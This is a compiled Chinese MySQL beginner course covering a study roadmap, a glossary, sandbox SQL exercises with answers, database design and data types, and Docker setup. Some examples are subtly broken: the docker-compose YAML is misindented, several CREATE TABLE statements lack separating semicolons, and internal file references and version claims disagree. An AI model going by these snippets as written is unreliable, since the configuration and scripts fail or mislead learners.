---
order: 10
title: mysql 模块文档合集
module: 'mysql'
category: 数据库
difficulty: intermediate
description: 本模块全部文档合并生成的完整合集，按学习顺序排列。
author: fanquanpp
updated: '2026-08-29'
related: []
prerequisites: []
---

<!-- ============ 文档分隔线：020-mysql/001-HowToUseThisCourse.md ============ -->

## 0.1 MySQL 第一阶段实战知识表

### SQL 语句族与学习顺序

| 语句族 | 常用关键字 | 先学目标 | 常见错误 |
| --- | --- | --- | --- |
| DQL | `SELECT`、`FROM`、`WHERE`、`ORDER BY`、`LIMIT` | 查出想要的数据 | 忘记 `WHERE` 导致全表扫描 |
| DML | `INSERT`、`UPDATE`、`DELETE` | 改变表中数据 | 更新或删除前不先 `SELECT` 确认范围 |
| DDL | `CREATE`、`ALTER`、`DROP` | 定义表结构 | 生产库直接改大表且没有回滚方案 |
| DCL | `GRANT`、`REVOKE` | 控制账户权限 | 给应用账号授予过大的权限 |
| TCL | `START TRANSACTION`、`COMMIT`、`ROLLBACK` | 控制事务边界 | 误以为每条语句都能自动回滚 |

### 零基础必须跑通的 5 条语句

```sql
CREATE TABLE students (
  id BIGINT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR(50) NOT NULL,
  score INT NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO students (name, score) VALUES ('Ada', 96), ('Linus', 88);
SELECT id, name, score FROM students WHERE score >= 90 ORDER BY score DESC;
UPDATE students SET score = 90 WHERE name = 'Linus';
DELETE FROM students WHERE score < 60;
```

### 读执行计划的最小口径

| 字段 | 先看什么 | 判断标准 |
| --- | --- | --- |
| `type` | 访问类型 | `const`、`ref` 通常优于 `ALL` |
| `key` | 实际使用的索引 | 为空说明没有用上候选索引 |
| `rows` | 预估扫描行数 | 数字越大越需要关注索引和过滤条件 |
| `Extra` | 额外操作 | `Using filesort`、`Using temporary` 需要结合场景分析 |


## 0. 这份资料怎么用

本模块有 87 篇文档，**不要按编号顺序读完**。它分为三类：

**必读（第一周，约 3-4 小时）**

- `000-SQL-Playground`：在线沙箱，先动手跑 SQL；
- `001-MySQLOverviewDatabaseDesign` 的第 0 节：五分钟写出第一句 SQL；
- `002-MySQLEnvSetup`：装好 MySQL 环境；
- `080-DQL` 的前 5 个动作：SELECT、WHERE、ORDER BY、LIMIT、COUNT。

**选读（第二周起，按需）**

- `003-MySQLDataTypeConstraint`、`078-DDL`、`079-DML`：建表与增删改；
- `027-MultiTableJoinDetailed`、`024-JOINAlgorithm`：多表查询；
- `071-MySQLQuickLookup`：随时查阅的速查手册。

**进阶（有基础后再读）**

- 索引原理（009-015、051、061）、事务与锁（025-030、065、069）、日志与备份（031-037）、复制与高可用（038-043、055）、分库分表（045、067）、性能调优（018-023、057）。

**三条原则**

1. 先动手再理解：先在沙箱里跑通，再回来读原理；
2. 术语不认识先查 `003-Glossary`，不要卡住；
3. 每条 SQL 都要自己敲一遍，复制粘贴记不住。

## 1. 学习路线图

详细时间线见 `002-Roadmap`。一句话版：

```text
第 1 周：沙箱 + SELECT 五动作 + 环境搭建
第 2 周：建表 + 增删改 + 常用函数
第 3 周：多表查询 + 索引入门
第 4 周：事务与锁
之后：按项目需要查对应专题
```

## 2. 预期时间与验收标准

| 阶段 | 预期时间 | 验收标准 |
| --- | --- | --- |
| 第一周 | 3-4 小时 | 能在沙箱里独立写出五条基础查询 |
| 第二周 | 4-6 小时 | 能建一张带主键的表并完成增删改 |
| 第三周 | 4-6 小时 | 能解释 INNER JOIN 与 LEFT JOIN 的区别 |
| 第四周 | 3-4 小时 | 能说出事务 ACID 与常用隔离级别 |

## 3. 常见误区

| 误区 | 真相 |
| --- | --- |
| 背语法 | 语法随用随查，重点是理解“查什么、怎么查” |
| 一上来读索引原理 | 先会写查询，再学优化 |
| 跳过环境搭建 | 沙箱能跑通就过关，本地环境第二周再装也行 |
| 用 MySQL 与 SQL 标准混学 | 先掌握通用 SQL，再学 MySQL 特有语法 |

> 一句话记住：先跑通、再理解、最后优化；看不懂的术语查 `000-Glossary`。

## 扩展学习

- 路线图：`mysql/002-Roadmap`；
- 术语表：`mysql/003-Glossary`；
- 沙箱练习：`mysql/004-SQLPlayground`；
- 第一课：`mysql/005-MySQLOverviewDatabaseDesign`。

<!-- ============ 文档分隔线：020-mysql/002-Roadmap.md ============ -->

## 0. 四周时间线

```mermaid
timeline
    title MySQL 零基础四周路线
    第 1 周 : 沙箱跑 SQL : SELECT/WHERE/ORDER BY/LIMIT/COUNT : 环境搭建
    第 2 周 : 建表与增删改 : 数据类型/主键/INSERT/UPDATE/DELETE
    第 3 周 : 多表与索引 : INNER JOIN/LEFT JOIN : 索引入门
    第 4 周 : 事务与锁 : ACID/隔离级别/常见锁
```

## 1. 第一周：先跑起来（约 3-4 小时）

必读：

1. `000-SQL-Playground`（沙箱，10 个练习）；
2. `001-MySQLOverviewDatabaseDesign` 第 0 节（五分钟第一句 SQL）；
3. `080-DQL` 前 5 个动作（SELECT、WHERE、ORDER BY、LIMIT、COUNT）；
4. `002-MySQLEnvSetup`（本地环境，可选）。

验收：能独立写出“查询年龄大于 18 的用户并按年龄排序取前 5 条”。

## 2. 第二周：会建表、会增删改（约 4-6 小时）

必读：

1. `003-MySQLDataTypeConstraint`（只学 INT/VARCHAR/DATE + 主键/非空/默认值）；
2. `078-DDL`（CREATE TABLE / ALTER TABLE）；
3. `079-DML`（INSERT/UPDATE/DELETE，重点：UPDATE/DELETE 必须带 WHERE）。

验收：能创建一张 `students` 表并完成增删改查。

## 3. 第三周：多表查询与索引（约 4-6 小时）

必读：

1. `027-MultiTableJoinDetailed`（先只学 INNER JOIN 与 LEFT JOIN）；
2. `009-ClusteredIndexSecondaryIndex`（索引是什么、为什么快）；
3. `071-MySQLQuickLookup`（遇到不会的语法先查这里）。

验收：能解释 INNER JOIN 与 LEFT JOIN 的区别，并说出索引为什么能加速。

## 4. 第四周：事务与锁（约 3-4 小时）

必读：

1. `025-TransactionIsolationImplementation`（ACID 与隔离级别）；
2. `028-LockClassification`（常见锁类型）；
3. `069-TransactionLockMechanism`（事务与锁配合）。

验收：能说出脏读/不可重复读/幻读分别被哪个隔离级别解决。

## 5. 之后：按需查阅

- 索引深入：009-017、051、061；
- 性能优化：018-023、057；
- 日志与备份：031-037；
- 复制与高可用：038-043、055；
- 分库分表：045、067；
- 安全：046-048、073-075；
- 面试与理论：077。

> 一句话记住：第一周先跑通查询，第二周会建表增删改，第三周懂多表与索引，第四周理解事务与锁；之后全是按需查阅。

## 扩展学习

- 使用指南：`mysql/001-HowToUseThisCourse`；
- 术语表：`mysql/003-Glossary`；
- 沙箱：`mysql/004-SQLPlayground`。

<!-- ============ 文档分隔线：020-mysql/003-Glossary.md ============ -->

## 0. 高频术语（按字母序）

| 术语 | 一句话解释 |
| --- | --- |
| ACID | 事务的四个保证：要么全成、要么全败、互不干扰、持久保存 |
| 事务（Transaction） | 一组要么全部成功、要么全部回滚的操作 |
| 主键（PRIMARY KEY） | 每行数据的“身份证号”，不能重复、不能为空 |
| 外键（FOREIGN KEY） | 指向另一张表主键的列，保证引用关系 |
| 索引（INDEX） | 给数据加的“目录”，查得快但写入变慢 |
| 视图（VIEW） | 一张“虚拟表”，本质是保存好的查询 |
| 存储过程 | 提前写好的 SQL 程序，可重复调用 |
| 触发器（TRIGGER） | 数据变化时自动执行的“钩子” |
| JOIN | 把两张表按关联列拼在一起看 |
| 内连接（INNER JOIN） | 只保留两边都匹配的行 |
| 左连接（LEFT JOIN） | 保留左表全部行，右表没有则补 NULL |
| 聚合函数 | 把多行压成一行：COUNT/SUM/AVG/MAX/MIN |
| GROUP BY | 按某列分组后再聚合 |
| 隔离级别 | 控制并发事务互相“看见多少”的档位 |
| 脏读 | 读到别人还没提交的数据 |
| 不可重复读 | 同一查询两次结果不同（别人改了） |
| 幻读 | 查询多出/少了行（别人插了/删了） |
| 锁 | 防止多人同时改同一数据出错的机制 |
| 死锁 | 两个事务互相等对方释放锁，谁也走不动 |
| MVCC | 通过多版本快照让读写互不阻塞的机制 |
| EXPLAIN | 查看一条 SQL 的执行计划（怎么查的） |
| 慢查询日志 | 记录执行慢的 SQL，用来找性能问题 |
| 主从复制 | 一份数据写到主库，同步到从库备份/分流 |
| 备份与恢复 | 把数据复制保存，坏了能还原 |
| 分库分表 | 数据太多时拆到多个库/表 |
| SQL 注入 | 把恶意 SQL 混进输入，让数据库执行 |
| NULL | 表示“没有值”，不是 0 也不是空字符串 |
| DDL | 定义结构的语句（建表/改表） |
| DML | 操作数据的语句（增/删/改） |
| DQL | 查询数据的语句（SELECT） |

> 一句话记住：术语卡住时回来查这张表；遇到新词，先用自己的话解释一遍再继续。

## 扩展学习

- 使用指南：`mysql/001-HowToUseThisCourse`；
- 路线图：`mysql/002-Roadmap`；
- 第一课：`mysql/005-MySQLOverviewDatabaseDesign`。

<!-- ============ 文档分隔线：020-mysql/004-SQLPlayground.md ============ -->

## 0. 怎么用这个沙箱

先准备一个能跑 SQL 的环境，任选其一：

1. 在线工具：SQLite Online、DB Fiddle 等（选 MySQL 模式）；
2. 本地：装好 MySQL 后执行 `mysql -u root -p`。

然后执行下面的建表与插入语句，得到一张 `students` 示例表：

```sql
CREATE TABLE students (
  id INT PRIMARY KEY,
  name VARCHAR(50) NOT NULL,
  age INT,
  score INT
);

INSERT INTO students (id, name, age, score) VALUES
  (1, 'Alice', 20, 92),
  (2, 'Bob', 18, 78),
  (3, 'Cathy', 22, 85),
  (4, 'David', 19, 65),
  (5, 'Eve', 21, 95);
```

## 1. 十个练习（由易到难）

先自己写，写不出来再看提示，最后跑一遍验证。

**练习 1：查看整张表**

```sql
SELECT * FROM students;
```

**练习 2：只查姓名和分数**

提示：`SELECT name, score FROM ...`

**练习 3：查年龄大于 19 的学生**

提示：`WHERE age > 19`

**练习 4：按分数从高到低排序**

提示：`ORDER BY score DESC`

**练习 5：只显示前 3 条**

提示：`LIMIT 3`

**练习 6：统计一共有多少人**

提示：`COUNT(*)`

**练习 7：查分数最高的学生**

提示：`ORDER BY score DESC LIMIT 1`，或 `MAX(score)`

**练习 8：查平均分**

提示：`AVG(score)`

**练习 9：按年龄段统计人数**

提示：`GROUP BY age` + `COUNT(*)`

**练习 10：组合查询——查年龄大于 18 的学生姓名，按分数降序取前 3**

提示：`SELECT name FROM students WHERE age > 18 ORDER BY score DESC LIMIT 3`

## 2. 参考答案

```sql
-- 练习 2
SELECT name, score FROM students;
-- 练习 3
SELECT * FROM students WHERE age > 19;
-- 练习 4
SELECT * FROM students ORDER BY score DESC;
-- 练习 5
SELECT * FROM students LIMIT 3;
-- 练习 6
SELECT COUNT(*) FROM students;
-- 练习 7
SELECT * FROM students ORDER BY score DESC LIMIT 1;
-- 练习 8
SELECT AVG(score) FROM students;
-- 练习 9
SELECT age, COUNT(*) FROM students GROUP BY age;
-- 练习 10
SELECT name FROM students WHERE age > 18 ORDER BY score DESC LIMIT 3;
```

## 3. 进阶挑战

1. 给表加一列 `gender` 并插入数据；
2. 再建一张 `courses` 表，练习 `INNER JOIN`；
3. 用 `UPDATE` 把某个学生的分数加 5 分，注意带 `WHERE`；
4. 用 `DELETE` 删除一条记录，注意带 `WHERE`。

> 一句话记住：先建表、再插入、然后随便查；每句 SQL 都亲手敲一遍。

## 扩展学习

- 查询语法：`mysql/084-DQL`；
- 建表：`mysql/007-MySQLDataTypeConstraint`；
- 术语：`mysql/003-Glossary`；
- 第一课：`mysql/005-MySQLOverviewDatabaseDesign`。

<!-- ============ 文档分隔线：020-mysql/005-MySQLOverviewDatabaseDesign.md ============ -->

## 0. 五分钟写出第一句 SQL（先读这里）

> 阅读指南：本节是必读第一课。后面的“标准演进”“方言对比”“选型决策”等内容属于【进阶查阅】，零基础可以先跳过，需要时再回来看。

先理解一句话：**SQL 就是跟数据库说话的语言**，MySQL 是听懂这句话的数据库软件之一。

打开 `000-SQL-Playground` 的沙箱（或本地 `mysql -u root -p`），建一张最简单的表并查询：

```sql
CREATE TABLE users (
  id INT PRIMARY KEY,
  name VARCHAR(50),
  age INT
);

INSERT INTO users (id, name, age) VALUES (1, 'Alice', 20), (2, 'Bob', 18);

SELECT name, age FROM users WHERE age > 18 ORDER BY age DESC LIMIT 5;
```

**讲解：**

- `CREATE TABLE` 建表，`INT`/`VARCHAR(50)` 是列的类型（整数/最长 50 字符的文本）；
- `PRIMARY KEY` 是主键：每行的“身份证号”，不能重复；
- `INSERT` 插入数据，括号里是列名，`VALUES` 后是每行的值；
- `SELECT` 查询：`WHERE` 过滤行、`ORDER BY` 排序、`LIMIT` 限制条数；
- 上面这条查询的意思是：查名字和年龄，只要年龄大于 18 的，按年龄从大到小排，最多返回 5 行。

**看到结果就过关**：如果你能跑通上面三句 SQL 并看到两行数据，第一课完成。看不懂的术语查 `000-Glossary`，练习不够去 `000-SQL-Playground` 刷 10 道题。



> 本节为增量补充，帮助你选择 MySQL 版本。

- MySQL：9.7 LTS（2026-04-21 发布，最新补丁 9.7.2）与 8.4 LTS（8.4.11）为企业推荐版本；26.7.0 为 Innovation 版（快速迭代、支持期短）。
- 生产环境优先选 LTS：新项目可从 8.4 起步，需要最新特性时评估 9.7 LTS。
- 配套工具：MySQL Shell、MySQL Workbench、官方 Connector 驱动，以及容器部署（mysql:9.7 镜像）。

## 1. 数据库概述 (Overview)

MySQL 是全球最受欢迎的**开源关系型数据库管理系统 (RDBMS)**，由 Oracle 公司维护和开发。它是 Web 应用开发中最常用的数据库之一，广泛应用于各种规模的应用系统。

### 1.1 数据库基础概念详解

#### 1.1.1 什么是数据库

数据库是按照数据结构来组织、存储和管理数据的仓库，它能够长期存储大量的数据，并且支持高效的查询和修改。数据库的发展经历了几个重要阶段：

- **层次数据库**：采用树形结构组织数据，如 IBM 的 IMS 系统
- **网状数据库**：采用网状结构组织数据，如 CODASYL 系统
- **关系型数据库**：采用二维表格形式组织数据，如 MySQL、Oracle、SQL Server
- **NoSQL 数据库**：非关系型数据库，如 MongoDB、Redis、Cassandra

#### 1.1.2 关系型数据库核心概念

| 概念                                | 描述                                               | 示例                                     |
| :---------------------------------- | :------------------------------------------------- | :--------------------------------------- |
| **关系型 (RDBMS)**                  | 数据存储在表中，表之间通过外键关联，遵循 ACID 特性 | MySQL、PostgreSQL、Oracle                |
| **SQL (Structured Query Language)** | 结构化查询语言，用于管理数据                       | `SELECT * FROM users`                    |
| **表 (Table)**                      | 数据的基本存储单元，由行和列组成                   | `users` 表、`orders` 表                  |
| **字段 (Column)**                   | 表中的列，定义数据类型                             | `id`、`name`、`email`                    |
| **记录 (Row)**                      | 表中的行，包含一条完整的数据                       | `(1, '张三', 'zhangsan@example.com')`    |
| **主键 (Primary Key)**              | 唯一标识表中记录的字段                             | `id INT PRIMARY KEY`                     |
| **外键 (Foreign Key)**              | 关联其他表主键的字段                               | `user_id INT REFERENCES users(id)`       |
| **索引 (Index)**                    | 加速数据查询的数据结构                             | `CREATE INDEX idx_email ON users(email)` |
| **事务 (Transaction)**              | 一组原子性的操作，要么全部成功，要么全部失败       | `START TRANSACTION; ... COMMIT;`         |

### 1.2 MySQL 架构详解

#### 1.2.1 MySQL 整体架构

MySQL 采用分层架构设计，主要分为三层：

```mermaid
flowchart TD
    Conn[客户端连接层 Connection<br/>连接管理、线程池、认证、安全] --> Server[MySQL 服务层 Server<br/>SQL 解析、优化器、缓存、日志]
    Server --> SE[存储引擎层 Storage Engine<br/>InnoDB、MyISAM、Memory 等<br/>数据存取、索引管理、事务支持]
```

#### 1.2.2 客户端连接层详解

客户端连接层负责处理客户端连接请求，主要功能包括：

- **连接管理**：管理客户端与服务器之间的连接，支持 TCP/IP、Socket、命名管道等多种连接方式
- **线程池**：为每个连接分配一个线程，或使用线程池复用线程，提高并发处理能力
- **用户认证**：验证用户名、密码和主机地址的合法性
- **安全控制**：基于 IP 地址的访问控制，SSL/TLS 加密连接
  **连接方式**：

```sql
 mysql -h 127.0.0.1 -P 3306 -u root -p
 mysql -u root -p --socket=/tmp/mysql.sock
 mysql -u root -p --pipe
```

#### 1.2.3 MySQL 服务层详解

服务层是 MySQL 的核心，包含以下主要组件：

- **SQL 接口**：接收和解析 SQL 语句
- **解析器**：将 SQL 语句解析成解析树
- **优化器**：生成最优的执行计划
- **缓存**：缓存查询结果（MySQL 8.0 已移除）
- **日志管理**：管理 binlog、slow log、error log 等
  **SQL 执行流程**：

```
 SQL 语句 → SQL 接口 → 解析器 → 优化器 → 执行器 → 存储引擎
```

### 1.3 核心特点 (Key Features)

- **高性能**: 优化的查询引擎 (InnoDB)，支持事务和行级锁，并发处理能力强
- **高可用**: 支持主从复制、集群部署、读写分离，提供多种高可用方案
- **安全性**: 完善的权限控制系统，支持 SSL 加密，细粒度的访问控制
- **可扩展性**: 支持分区表、分库分表、读写分离，可根据业务需求扩展
- **社区活跃**: 丰富的文档和第三方支持，活跃的开发者社区
- **跨平台**: 支持 Windows、Linux、macOS 等多种操作系统
- **开源免费**: Community Edition 完全免费，降低使用成本
- **丰富的存储引擎**: 支持 InnoDB、MyISAM、Memory、Archive 等多种存储引擎
- **强大的复制功能**: 支持异步复制、半同步复制、组复制，满足不同场景需求
- **存储过程和触发器**: 支持复杂的业务逻辑实现
- **全文索引**: 支持全文搜索功能

### 1.4 MySQL 版本选择

| 版本类型               | 特点                                                    | 适用场景                     |
| :--------------------- | :------------------------------------------------------ | :--------------------------- |
| **Community Edition**  | 免费开源版本，功能完整                                  | 大多数应用场景，包括生产环境 |
| **Enterprise Edition** | 商业版本，提供更多高级功能和技术支持                    | 企业级应用，需要官方技术支持 |
| **Cluster CGE**        | 集群版本，提供高可用性和横向扩展能力                    | 高可用要求的关键业务系统     |
| **MySQL 8.0**          | 最新稳定版本，提供更多新特性（CTE、窗口函数、JSON增强） | 新项目或计划升级的系统       |
| **MySQL 8.4 (LTS)**    | 长期支持版本，稳定可靠                                  | 生产环境首选                 |
| **MySQL 5.7**          | 稳定版本，广泛使用                                      | 现有系统，兼容性要求高的场景 |

### 1.5 MySQL 8.0 新特性

MySQL 8.0 带来了众多新特性和改进：

- **窗口函数 (Window Functions)**：支持 ROW_NUMBER、RANK、DENSE_RANK 等分析函数
- **公用表表达式 (CTE)**：支持 WITH 子句，简化复杂查询
- **JSON 增强**：新增 JSON_TABLE、JSON_ARRAYAGG、JSON_OBJECTAGG 等函数
- **角色管理**：支持创建和应用角色，简化权限管理
- **窗口函数的增强**：支持 LAG、LEAD、FIRST_VALUE、LAST_VALUE 等
- **不可见索引**：支持创建不可见索引，用于测试索引效果
- **降序索引**：支持创建降序索引，优化特定查询
- **直方图统计**：支持创建直方图统计信息，优化查询计划
- **原子 DDL**：支持原子数据定义语句

### 1.6 MySQL 应用场景

| 应用场景       | 说明                       | 推荐配置                        |
| :------------- | :------------------------- | :------------------------------ |
| **Web 应用**   | 博客、电商、内容管理系统等 | InnoDB 存储引擎，适当配置连接池 |
| **企业应用**   | ERP、CRM、OA 等企业系统    | InnoDB + 主从复制，保证高可用   |
| **数据仓库**   | 数据分析、报表系统         | MySQL 集群或使用列式存储        |
| **嵌入式系统** | 小型应用、移动应用后端     | Memory 存储引擎，减少资源占用   |
| **游戏后端**   | 游戏数据存储、用户管理     | InnoDB + Redis 缓存，提高并发   |

## 2. 数据库设计基础

### 2.1 设计原则详解

#### 2.1.1 数据库范式

**第一范式 (1NF) - 原子性**

- 要求每个字段都是不可分割的原子值
- 示例：地址字段应拆分为省、市、区、详细地址
  **第二范式 (2NF) - 完全依赖**
- 满足1NF
- 非主键字段必须完全依赖于主键，不能只依赖于主键的一部分
- 示例：订单明细表中，(order_id, product_id) 为主键，price 完全依赖于这两个字段
  **第三范式 (3NF) - 消除传递依赖**
- 满足2NF
- 非主键字段不能传递依赖于主键
- 示例：员工表有部门信息，部门表有部门主管，员工不应该通过部门间接获得主管信息
  **BC范式 (BCNF)**
- 满足3NF
- 任何表中不能存在对键的某一部分的函数依赖
- 示例：学生选修课程，教师授课，每门课程有固定教师，学生选课时确定教师

#### 2.1.2 反规范化

在某些场景下，为了提高查询性能，可以适当增加数据冗余：

- **冗余字段**：在订单表中冗余用户名称，避免连接查询
- **预计算字段**：在订单表中存储商品数量总和，避免 COUNT 查询
- **中间表**：为复杂查询创建汇总表

### 2.2 常用数据类型详解

#### 2.2.1 整数类型

| 类型      | 存储空间 | 有符号范围       | 无符号范围 | 适用场景     |
| :-------- | :------- | :--------------- | :--------- | :----------- |
| TINYINT   | 1字节    | -128~127         | 0~255      | 状态码、年龄 |
| SMALLINT  | 2字节    | -32768~32767     | 0~65535    | 数量、计数器 |
| MEDIUMINT | 3字节    | -8388608~8388607 | 0~16777215 | 中等数值     |
| INT       | 4字节    | -21亿~21亿       | 0~42亿     | ID、主键     |
| BIGINT    | 8字节    | 很大             | 0~很大     | 大数值、金额 |

#### 2.2.2 字符串类型

| 类型       | 最大长度  | 特点                      | 适用场景                 |
| :--------- | :-------- | :------------------------ | :----------------------- |
| CHAR(n)    | 255字符   | 定长，末尾补空格          | 固定长度（性别、状态码） |
| VARCHAR(n) | 65535字节 | 变长，需要1-2字节存储长度 | 姓名、地址、标题         |
| TINYTEXT   | 255字节   | -                         | 短文本                   |
| TEXT       | 65535字节 | 不能有默认值              | 文章内容、评论           |
| MEDIUMTEXT | 16MB      | -                         | 长文章                   |
| LONGTEXT   | 4GB       | -                         | 超大文本                 |

#### 2.2.3 日期时间类型

| 类型      | 格式                | 范围                 | 存储空间 | 特点                 |
| :-------- | :------------------ | :------------------- | :------- | :------------------- |
| DATE      | YYYY-MM-DD          | 1000-9999            | 3字节    | 仅日期               |
| TIME      | HH:MM:SS            | -838:59:59~838:59:59 | 3字节    | 仅时间               |
| DATETIME  | YYYY-MM-DD HH:MM:SS | 1000-9999            | 8字节    | 日期时间，存储实际值 |
| TIMESTAMP | YYYY-MM-DD HH:MM:SS | 1970-2038            | 4字节    | 自动更新，时区敏感   |
| YEAR      | YYYY                | 1901-2155            | 1字节    | 年份                 |

#### 2.2.4 浮点数和定点数

| 类型         | 存储空间 | 特点                 | 适用场景   |
| :----------- | :------- | :------------------- | :--------- |
| FLOAT        | 4字节    | 单精度，可能丢失精度 | 科学计算   |
| DOUBLE       | 8字节    | 双精度，可能丢失精度 | 科学计算   |
| DECIMAL(M,D) | 可变     | 精确存储，推荐使用   | 金额、价格 |

**金额计算示例**：

```sql
 CREATE TABLE accounts (
  id INT PRIMARY KEY,
  balance DECIMAL(10,2) NOT NULL DEFAULT 0.00
 )
```

### 2.3 数据库设计示例

#### 2.3.1 电商系统完整设计

```sql
 CREATE TABLE categories (
  id INT PRIMARY KEY AUTO_INCREMENT,
  parent_id INT DEFAULT NULL COMMENT '父分类ID',
  name VARCHAR(50) NOT NULL COMMENT '分类名称',
  sort INT DEFAULT 0 COMMENT '排序',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (parent_id) REFERENCES categories(id) ON DELETE SET NULL,
  INDEX idx_parent_id (parent_id)
 )
 CREATE TABLE products (
  id INT PRIMARY KEY AUTO_INCREMENT,
  category_id INT NOT NULL COMMENT '分类ID',
  name VARCHAR(100) NOT NULL COMMENT '商品名称',
  subtitle VARCHAR(200) COMMENT '副标题',
  price DECIMAL(10,2) NOT NULL COMMENT '售价',
  cost DECIMAL(10,2) COMMENT '成本',
  stock INT NOT NULL DEFAULT 0 COMMENT '库存',
  sales INT NOT NULL DEFAULT 0 COMMENT '销量',
  description TEXT COMMENT '商品描述',
  image VARCHAR(255) COMMENT '主图',
  status TINYINT DEFAULT 1 COMMENT '状态：1-上架 0-下架',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  FOREIGN KEY (category_id) REFERENCES categories(id),
  INDEX idx_category_id (category_id),
  INDEX idx_status (status),
  INDEX idx_sales (sales)
 )
 CREATE TABLE product_skus (
  id INT PRIMARY KEY AUTO_INCREMENT,
  product_id INT NOT NULL COMMENT '商品ID',
  name VARCHAR(100) NOT NULL COMMENT 'SKU名称（如：颜色-红色）',
  price DECIMAL(10,2) NOT NULL COMMENT 'SKU价格',
  stock INT NOT NULL DEFAULT 0 COMMENT 'SKU库存',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (product_id) REFERENCES products(id) ON DELETE CASCADE,
  INDEX idx_product_id (product_id)
 )
 CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  username VARCHAR(50) NOT NULL UNIQUE COMMENT '用户名',
  password VARCHAR(255) NOT NULL COMMENT '密码（加密）',
  email VARCHAR(100) UNIQUE COMMENT '邮箱',
  phone VARCHAR(20) UNIQUE COMMENT '手机号',
  avatar VARCHAR(255) COMMENT '头像',
  gender TINYINT COMMENT '性别：0-未知 1-男 2-女',
  birthday DATE COMMENT '生日',
  level INT DEFAULT 0 COMMENT '会员等级',
  points INT DEFAULT 0 COMMENT '积分',
  balance DECIMAL(10,2) DEFAULT 0.00 COMMENT '余额',
  status TINYINT DEFAULT 1 COMMENT '状态：1-正常 0-禁用',
  last_login_at DATETIME COMMENT '最后登录时间',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  INDEX idx_username (username),
  INDEX idx_phone (phone),
  INDEX idx_email (email)
 )
 CREATE TABLE addresses (
  id INT PRIMARY KEY AUTO_INCREMENT,
  user_id INT NOT NULL COMMENT '用户ID',
  consignee VARCHAR(50) NOT NULL COMMENT '收货人',
  phone VARCHAR(20) NOT NULL COMMENT '联系电话',
  province VARCHAR(50) NOT NULL COMMENT '省份',
  city VARCHAR(50) NOT NULL COMMENT '城市',
  district VARCHAR(50) NOT NULL COMMENT '区县',
  detail_address VARCHAR(255) NOT NULL COMMENT '详细地址',
  is_default TINYINT DEFAULT 0 COMMENT '是否默认：1-默认 0-非默认',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
  INDEX idx_user_id (user_id),
  INDEX idx_is_default (is_default)
 )
```

## 3. 总结

### 3.1 关键要点回顾

- **选择合适的版本**: MySQL 8.0/8.4 是当前主流，推荐使用 LTS 版本
- **合理的数据库设计**: 遵循范式化原则，根据业务场景适当反规范化
- **性能优化**: 从服务器配置、索引设计、SQL 语句等多个方面综合优化
- **安全管理**: 加强访问控制，定期更换密码，使用最小权限原则
- **监控与维护**: 建立完善的监控体系，定期进行维护任务

### 3.2 学习建议

1. **夯实基础**：熟练掌握 SQL 语法，包括 DDL、DML、DQL
2. **深入原理**：理解 MySQL 架构、存储引擎、索引原理
3. **注重实践**：多练习实际项目中的数据库设计和管理
4. **性能调优**：学习使用 EXPLAIN 分析执行计划，优化慢查询
5. **高可用架构**：了解主从复制、读写分离、分库分表等方案

<!-- ============ 文档分隔线：020-mysql/006-MySQLEnvSetup.md ============ -->

## 1. 安装方法对比

| 安装方式     | 优点                           | 缺点                 | 推荐场景       |
| :----------- | :----------------------------- | :------------------- | :------------- |
| **Docker**   | 部署快速、可移植性强、环境隔离 | 需要 Docker 基础知识 | 开发、测试环境 |
| **二进制包** | 安装简单、性能好               | 需要手动配置         | 生产环境       |
| **源码编译** | 可定制、针对硬件优化           | 编译时间长           | 特殊需求场景   |
| **包管理器** | 安装便捷、自动更新             | 版本可能不是最新     | 快速部署       |

## 2. Docker 部署 (推荐)

Docker 部署是最便捷的方式，适合开发和测试环境：

### 2.1 基本 Docker 操作

```bash
 # 拉取 MySQL 镜像（推荐 8.0 或 8.4 LTS 版本）
 docker pull mysql:8.4
 # 查看本地镜像
 docker images mysql
 # 运行 MySQL 容器（基本配置）
 docker run --name mysql \
  -e MYSQL_ROOT_PASSWORD=your_password \
  -p 3306:3306 \
  -d mysql:8.4
 # 运行带持久化的 MySQL 容器
 docker run --name mysql \
  -e MYSQL_ROOT_PASSWORD=your_password \
  -e MYSQL_DATABASE=mydb \
  -e MYSQL_USER=user \
  -e MYSQL_PASSWORD=user_password \
  -p 3306:3306 \
  -v mysql-data:/var/lib/mysql \
  -d mysql:8.4 --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci
 # 查看容器状态
 docker ps
 # 查看容器日志
 docker logs mysql
 # 进入容器
 docker exec -it mysql bash
 # 在容器内连接 MySQL
 mysql -u root -p
```

### 2.2 Docker Compose 部署

创建 `docker-compose.yml` 文件：

```yaml
version: '3.8'
services:
  mysql:
  image: mysql:8.4
  container_name: mysql
  environment:
  MYSQL_ROOT_PASSWORD: root_password
  MYSQL_DATABASE: mydb
  MYSQL_USER: dbuser
  MYSQL_PASSWORD: user_password
  ports:
    - '3306:3306'
  volumes:
    - mysql-data:/var/lib/mysql
    - ./my.cnf:/etc/mysql/conf.d/my.cnf
  command: --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci
volumes:
  mysql-data:
```

启动命令：

```bash
 docker-compose up -d
```

### 2.3 生产环境 Docker 配置

```bash
 # 生产环境推荐配置
 docker run --name mysql \
  --restart=always \
  -e MYSQL_ROOT_PASSWORD=complex_password \
  -e MYSQL_DATABASE=production_db \
  -e MYSQL_USER=app_user \
  -e MYSQL_PASSWORD=app_password \
  -p 3306:3306 \
  -v /host/path/mysql/data:/var/lib/mysql \
  -v /host/path/mysql/conf.d:/etc/mysql/conf.d \
  -d mysql:8.4 \
  --character-set-server=utf8mb4 \
  --collation-server=utf8mb4_unicode_ci \
  --max-connections=500 \
  --innodb-buffer-pool-size=2G
```

## 3. Windows 安装

### 3.1 使用 MySQL Installer 安装

